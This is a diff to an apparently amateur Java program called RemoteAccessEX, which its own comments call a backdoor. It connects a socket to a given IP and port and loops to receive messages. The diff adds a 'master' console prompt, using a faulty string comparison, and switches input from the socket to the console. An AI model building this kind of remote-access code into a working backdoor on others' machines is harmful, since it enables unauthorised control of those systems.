@@ -4,7 +4,7 @@ import java.net.*;
 import java.io.*;
 //methods to add, connect, execute, resolve
 public class RemoteAccessEX{
-  private static Socket s; //socket recieves input
+  private static Socket s; //
   private static Scanner sc;//takes in input from stream
   private static PrintWriter pr;//write info to the socket
   private static int length;//amount of args passed to backdoor
@@ -12,6 +12,8 @@ public class RemoteAccessEX{
   private static BufferedReader in;//get output
   private static String line;
   private static String stdout;
+  private static Boolean master;
+  private static Console c;
 
   private static int connect(String ip, int port){///method attempts to create the connection
     try{
@@ -76,21 +78,28 @@ public class RemoteAccessEX{
     System.out.println("connecting");}
     System.out.println("connected");//connected
     pr=new PrintWriter(s.getOutputStream(),true); // look at output stream
-    sc = new Scanner(s.getInputStream());// look at output stream
+    sc = new Scanner(s.getInputStream());// look at input stream
+    c= System.console();
+    master=false;
+    String answer = c.readLine("are you the master? (y/n): ");
+    if(answer=="y"){master=true;}
     sc.useDelimiter("\0");//Delimiter is used in order to know the end of the message received.
     String recieved;
     String stdout;
+
     while(true){
+      c.flush();
       System.out.println("listening");
 
       try{//try to recieve message
         System.out.println("entered try");
 
-        recieved = sc.next();
-        recieved =  recieved.trim();
-        recieved =  recieved.replace("\0","");
-        System.out.println(recieved);
-        System.out.println("message got");
+        recieved = c.readLine();
+
+    //    recieved =  recieved.trim();
+      //  recieved =  recieved.replace("\0","");
+        System.out.println("got: "+recieved);
+        //System.out.println("message got");
 
         if( recieved.contains("quit")){///exit if message is quit
           pr.println("quit");
